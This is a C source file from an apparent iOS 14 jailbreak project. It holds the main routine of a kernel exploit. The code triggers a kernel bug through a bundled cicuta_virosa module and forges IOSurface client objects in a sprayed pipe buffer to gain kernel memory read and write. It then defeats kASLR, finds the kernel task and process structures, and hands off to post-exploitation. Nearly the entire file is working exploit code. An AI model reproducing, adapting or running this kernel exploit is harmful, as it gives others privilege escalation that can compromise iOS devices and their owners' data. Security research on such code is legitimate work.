//
//  exploit_main.c
//  pre-jailbreak
//
//  Created by Quote on 2021/2/19.
//

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdbool.h>
#include <sys/time.h>
#include <mach/mach.h>

#include "mycommon.h"
#include "k_offsets.h"
#include "utils.h"
#include "k_utils.h"
#include "kapi.h"
#include "user_kernel_alloc.h"
#include "cicuta_virosa/cicuta_virosa.h"

extern mach_port_t IOSurfaceRootUserClient;
uint32_t iosurface_create_fast(void);
uint32_t iosurface_s_get_ycbcrmatrix(void);
void iosurface_s_set_indexed_timestamp(uint64_t v);

static int *pipefds;
static size_t pipe_buffer_size = 0x1000;
static uint8_t *pipe_buffer;
static kptr_t IOSurfaceRoot_uc;

static void read_pipe()
{
    size_t read_size = pipe_buffer_size - 1;
    ssize_t count = read(pipefds[0], pipe_buffer, read_size);
    if (count == read_size) {
        return;
    } else if (count == -1) {
        perror("read_pipe");
        util_error("could not read pipe buffer");
    } else if (count == 0) {
        util_error("pipe is empty");
    } else {
        util_error("partial read %zu of %zu bytes", count, read_size);
    }
    fail_info(__FUNCTION__);
}

static void write_pipe()
{
    size_t write_size = pipe_buffer_size - 1;
    ssize_t count = write(pipefds[1], pipe_buffer, write_size);
    if (count == write_size) {
        return;
    } else if (count < 0) {
        util_error("could not write pipe buffer");
    } else if (count == 0) {
        util_error("pipe is full");
    } else {
        util_error("partial write %zu of %zu bytes", count, write_size);
    }
    fail_info(__FUNCTION__);
}

static void build_stable_kmem_api()
{
    static kptr_t pipe_base;
    kptr_t p_fd = kapi_read_kptr(g_exp.self_proc + OFFSET(proc, p_fd));
    kptr_t fd_ofiles = kapi_read_kptr(p_fd + OFFSET(filedesc, fd_ofiles));
    kptr_t rpipe_fp = kapi_read_kptr(fd_ofiles + sizeof(kptr_t) * pipefds[0]);
    kptr_t fp_glob = kapi_read_kptr(rpipe_fp + OFFSET(fileproc, fp_glob));
    kptr_t rpipe = kapi_read_kptr(fp_glob + OFFSET(fileglob, fg_data));
    pipe_base = kapi_read_kptr(rpipe + OFFSET(pipe, buffer));

    // XXX dirty hack, but I'm lucky :)
    uint8_t bytes[20];
    read_20(IOSurfaceRoot_uc + OFFSET(IOSurfaceRootUserClient, surfaceClients) - 4, bytes);
    *(kptr_t *)(bytes + 4) = pipe_base;
    write_20(IOSurfaceRoot_uc + OFFSET(IOSurfaceRootUserClient, surfaceClients) - 4, bytes);

    // iOS 14.x only
    struct fake_client {
        kptr_t pad_00; // can not use IOSurface 0 now
        kptr_t uc_obj;
        uint8_t pad_10[0x40]; // start of IOSurfaceClient obj
        kptr_t surf_obj;
        uint8_t pad_58[0x360 - 0x58];
        kptr_t shared_RW;
    };

    stage0_read32 = ^uint32_t (kptr_t addr) {
        struct fake_client *p = (void *)pipe_buffer;
        p->uc_obj = pipe_base + 16;
        p->surf_obj = addr - 0xb4;
        write_pipe();
        uint32_t v = iosurface_s_get_ycbcrmatrix();
        read_pipe();
        return v;
    };

    stage0_read64 = ^uint64_t (kptr_t addr) {
        uint64_t v = stage0_read32(addr);
        v |= (uint64_t)stage0_read32(addr + 4) << 32;
        return v;
    };

    stage0_read_kptr = ^kptr_t (kptr_t addr) {
        uint64_t v = stage0_read64(addr);
        if (v && (v >> 39) != 0x1ffffff) {
            if (g_exp.debug) {
                util_info("PAC %#llx -> %#llx", v, v | 0xffffff8000000000);
            }
            v |= 0xffffff8000000000; // untag, 25 bits
        }
        return (kptr_t)v;
    };

    stage0_read = ^void (kptr_t addr, void *data, size_t len) {
        uint8_t *_data = data;
        uint32_t v;
        size_t pos = 0;
        while (pos < len) {
            v = stage0_read32(addr + pos);
            memcpy(_data + pos, &v, len - pos >= 4 ? 4 : len - pos);
            pos += 4;
        }
    };

    stage0_write64 = ^void (kptr_t addr, uint64_t v) {
        struct fake_client *p = (void *)pipe_buffer;
        p->uc_obj = pipe_base + 0x10;
        p->surf_obj = pipe_base;
        p->shared_RW = addr;
        write_pipe();
        iosurface_s_set_indexed_timestamp(v);
        read_pipe();
    };

    stage0_write = ^void (kptr_t addr, void *data, size_t len) {
        uint8_t *_data = data;
        uint64_t v;
        size_t pos = 0;
        while (pos < len) {
            size_t bytes = 8;
            if (bytes > len - pos) {
                bytes = len - pos;
                v = stage0_read64(addr + pos);
            }
            memcpy(&v, _data + pos, bytes);
            stage0_write64(addr + pos, v);
            pos += 8;
        }
    };
}

static void build_stage0_kmem_api()
{
    stage0_read32 = ^uint32_t (kptr_t addr) {
        uint32_t v = read_32(addr);
        return v;
    };

    stage0_read64 = ^uint64_t (kptr_t addr) {
        uint64_t v = read_64(addr);
        return v;
    };

    stage0_read_kptr = ^kptr_t (kptr_t addr) {
        uint64_t v = stage0_read64(addr);
        if (v && (v >> 39) != 0x1ffffff) {
            if (g_exp.debug) {
                util_info("PAC %#llx -> %#llx", v, v | 0xffffff8000000000);
            }
            v |= 0xffffff8000000000; // untag, 25 bits
        }
        return (kptr_t)v;
    };

    stage0_read = ^void (kptr_t addr, void *data, size_t len) {
        uint8_t *_data = data;
        uint64_t v;
        size_t pos = 0;
        while (pos < len) {
            v = stage0_read64(addr + pos);
            memcpy(_data + pos, &v, len - pos >= 8 ? 8 : len - pos);
            pos += 8;
        }
    };

    stage0_write64 = ^void (kptr_t addr, uint64_t v) {
        stage0_write(addr, &v, sizeof(v));
    };

    stage0_write = ^void (kptr_t addr, void *data, size_t len) {
        uint8_t *_data = data;
        uint8_t v[20];
        size_t pos = 0;
        while (pos < len) {
            size_t bytes = 20;
            if (bytes > len - pos) {
                bytes = len - pos;
                read_20(addr + pos, v);
            }
            memcpy(v, _data + pos, bytes);
            write_20(addr + pos, v);
            pos += 20;
        }
    };
}

void exploit_main(void)
{
    sys_init();
    kernel_offsets_init();
    bool ok = IOSurface_init();
    fail_if(!ok, "can not init IOSurface lib");
    uint32_t surf_id = iosurface_create_fast();
    util_info("surface_id %u", surf_id);
    size_t pipe_count = 1;
    pipefds = create_pipes(&pipe_count);
    pipe_buffer = (uint8_t *)malloc(pipe_buffer_size);
    memset_pattern4(pipe_buffer, "pipe", pipe_buffer_size);
    pipe_spray(pipefds, 1, pipe_buffer, pipe_buffer_size, NULL);
    read_pipe();

    struct timeval tv1, tv2;
    gettimeofday(&tv1, NULL);
    // open the door to iOS 14
    cicuta_virosa();
    gettimeofday(&tv2, NULL);
    uint64_t cost = (tv2.tv_sec - tv1.tv_sec) * 1000 * 1000 + tv2.tv_usec - tv1.tv_usec;
    util_info("cost %.3f seconds", cost / 1000000.0);

    build_stage0_kmem_api();

    g_exp.self_ipc_space = kapi_read_kptr(g_exp.self_task + OFFSET(task, itk_space));
    g_exp.self_proc = kapi_read_kptr(g_exp.self_task + OFFSET(task, bsd_info));

    kptr_t IOSurfaceClient_obj;
    {
        kptr_t entry = ipc_entry_lookup(IOSurfaceRootUserClient);
        kptr_t object = kapi_read_kptr(entry + OFFSET(ipc_entry, ie_object));
        kptr_t kobject = kapi_read_kptr(object + OFFSET(ipc_port, ip_kobject));
        IOSurfaceRoot_uc = kobject;
        kptr_t surfaceClients = kapi_read_kptr(kobject + OFFSET(IOSurfaceRootUserClient, surfaceClients));
        IOSurfaceClient_obj = kapi_read_kptr(surfaceClients + sizeof(kptr_t) * surf_id);
    }

    util_info("build stable kernel r/w primitives");
    build_stable_kmem_api();
    util_info("---- done ----");

    kptr_t vt_ptr = kapi_read64(IOSurfaceClient_obj);
    if ((vt_ptr >> 39) != 0x1ffffff) {
        g_exp.has_PAC = true;
    }

    util_info("defeat kASLR");

    kptr_t IOSurfaceClient_vt;
    kptr_t IOSurfaceClient_vt_0;
    IOSurfaceClient_vt = kapi_read_kptr(IOSurfaceClient_obj);
    IOSurfaceClient_vt_0 = kapi_read_kptr(IOSurfaceClient_vt);

    util_info("vt %#llx, vt[0] %#llx", IOSurfaceClient_vt, IOSurfaceClient_vt_0);
    util_msleep(100);

    // device&OS dependent
    kptr_t text_slide = IOSurfaceClient_vt_0 - kc_IOSurfaceClient_vt_0;
    kptr_t data_slide = IOSurfaceClient_vt - kc_IOSurfaceClient_vt;

    kptr_t kernel_base = kc_kernel_base + text_slide;
    kptr_t kernel_map = kc_kernel_map + data_slide;
    kptr_t kernel_task = kc_kernel_task + data_slide;

    kptr_t kernel_map_ptr;
    kernel_map_ptr = kapi_read_kptr(kernel_map);

    kptr_t kernel_task_ptr;
    kernel_task_ptr = kapi_read_kptr(kernel_task);

    util_info("kernel slide %#llx", text_slide);
    util_info("kernel base %#llx, kernel_map < %#llx: %#llx >", kernel_base, kernel_map, kernel_map_ptr);

    util_info("verify kernel header");
#ifdef __arm64e__
    const uint32_t mach_header[4] = { 0xfeedfacf, 0x0100000c, 0xc0000002, 2 };
#else
    const uint32_t mach_header[4] = { 0xfeedfacf, 0x0100000c, 0, 2 };
#endif
    uint32_t data[4] = {};
    kapi_read(kernel_base, data, sizeof(mach_header));
    util_hexprint_width(data, sizeof(data), 4, "_mh_execute_header");
    int diff = memcmp(mach_header, data, sizeof(uint32_t [2]));
    fail_if(diff, "mach_header mismatch");

    g_exp.kernel_task = kernel_task_ptr;
    g_exp.kernel_proc = kapi_read_kptr(g_exp.kernel_task + OFFSET(task, bsd_info));

    if (g_exp.debug) {
        util_info("---- dump kernel cred ----");
        debug_dump_proc_cred(g_exp.kernel_proc);
        util_info("---- dump self cred ----");
        debug_dump_proc_cred(g_exp.self_proc);
    }

    post_exploit();

    // clean KHEAP by yourself
}
